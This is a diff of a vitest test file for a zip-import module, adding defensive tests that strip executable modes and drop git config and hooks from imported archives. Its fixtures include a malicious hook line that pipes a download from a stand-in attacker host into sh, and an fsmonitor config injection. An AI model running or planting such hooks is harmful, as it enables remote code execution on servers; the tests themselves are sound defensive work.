@@ -1,11 +1,19 @@
 import { execFile } from 'node:child_process';
-import { mkdir, mkdtemp, readFile, rm, stat, symlink, writeFile } from 'node:fs/promises';
+import { existsSync } from 'node:fs';
+import { chmod, mkdir, mkdtemp, readFile, rm, stat, symlink, writeFile } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { promisify } from 'node:util';
 import { afterEach, describe, expect, it } from 'vitest';
 import { isAppError } from '@tablinum/shared';
-import { crc32, isSafeEntryName, readZip, unzipToDirectory, zipDirectory } from '../src/zip.js';
+import {
+  crc32,
+  isImportableGitEntry,
+  isSafeEntryName,
+  readZip,
+  unzipToDirectory,
+  zipDirectory,
+} from '../src/zip.js';
 
 const run = promisify(execFile);
 const roots: string[] = [];
@@ -83,15 +91,18 @@ describe('zipDirectory', () => {
     expect(entries.find((entry) => entry.name === 'tiny.txt')?.data.toString()).toBe('x');
   });
 
-  it('keeps the executable bit, which git hooks need', async () => {
+  it('records a file mode but never restores it', async () => {
     const source = await tempDir();
     await write(source, 'hook.sh', '#!/bin/sh\n');
-    const { chmod } = await import('node:fs/promises');
     await chmod(join(source, 'hook.sh'), 0o755);
 
+    const archive = await zipDirectory(source);
+    expect(readZip(archive).find((entry) => entry.name === 'hook.sh')?.mode).toBe(0o755);
+
     const target = await tempDir();
-    await unzipToDirectory(await zipDirectory(source), target);
-    expect((await stat(join(target, 'hook.sh'))).mode & 0o111).not.toBe(0);
+    await unzipToDirectory(archive, target);
+    // Nothing an archive carries may land executable: a git hook would then run as the server.
+    expect((await stat(join(target, 'hook.sh'))).mode & 0o111).toBe(0);
   });
 
   it('leaves a symlink out rather than following it', async () => {
@@ -163,6 +174,31 @@ describe('unzipToDirectory', () => {
     expect(codeOf(failure)).toBe('VALIDATION');
   });
 
+  it('leaves out the git metadata that carries code, and keeps the history', async () => {
+    const source = await tempDir();
+    await write(source, 'docs/page.md', '# Page\n');
+    await write(source, '.git/HEAD', 'ref: refs/heads/main\n');
+    await write(source, '.git/packed-refs', '# pack-refs with: peeled\n');
+    await write(source, '.git/objects/ab/cdef', Buffer.from([1, 2, 3]));
+    await write(source, '.git/refs/heads/main', 'aaaa\n');
+    await write(source, '.git/config', '[core]\n\tfsmonitor = "touch /tmp/pwned"\n');
+    await write(source, '.git/hooks/post-commit', '#!/bin/sh\ncurl http://attacker/x | sh\n');
+    await chmod(join(source, '.git/hooks/post-commit'), 0o755);
+    await chmod(join(source, 'docs/page.md'), 0o755);
+
+    const target = await tempDir();
+    const written = await unzipToDirectory(await zipDirectory(source), target);
+
+    expect(written).toBe(5);
+    expect(await readFile(join(target, 'docs/page.md'), 'utf8')).toBe('# Page\n');
+    expect(await readFile(join(target, '.git/HEAD'), 'utf8')).toBe('ref: refs/heads/main\n');
+    expect(await readFile(join(target, '.git/refs/heads/main'), 'utf8')).toBe('aaaa\n');
+    expect(existsSync(join(target, '.git/objects/ab/cdef'))).toBe(true);
+    expect(existsSync(join(target, '.git/config'))).toBe(false);
+    expect(existsSync(join(target, '.git/hooks/post-commit'))).toBe(false);
+    expect((await stat(join(target, 'docs/page.md'))).mode & 0o777).toBe(0o644);
+  });
+
   it('refuses an entry whose bytes do not match its checksum', async () => {
     const source = await tempDir();
     await write(source, 'ok.md', 'x'.repeat(50));
@@ -176,6 +212,23 @@ describe('unzipToDirectory', () => {
     const target = await tempDir();
     const failure = await unzipToDirectory(damaged, target).catch((err: unknown) => err);
     expect(codeOf(failure)).toBe('VALIDATION');
+  });
+});
+
+describe('isImportableGitEntry', () => {
+  it('keeps history and refuses anything git would execute', () => {
+    expect(isImportableGitEntry('eng/deploy.md')).toBe(true);
+    expect(isImportableGitEntry('.gitattributes')).toBe(true);
+    expect(isImportableGitEntry('.git/HEAD')).toBe(true);
+    expect(isImportableGitEntry('.git/packed-refs')).toBe(true);
+    expect(isImportableGitEntry('.git/objects/ab/cdef')).toBe(true);
+    expect(isImportableGitEntry('.git/refs/heads/main')).toBe(true);
+
+    expect(isImportableGitEntry('.git/config')).toBe(false);
+    expect(isImportableGitEntry('.git/hooks/post-commit')).toBe(false);
+    expect(isImportableGitEntry('.git/hooks/')).toBe(false);
+    expect(isImportableGitEntry('.git/info/exclude')).toBe(false);
+    expect(isImportableGitEntry('.GIT/config')).toBe(false);
   });
 });
 
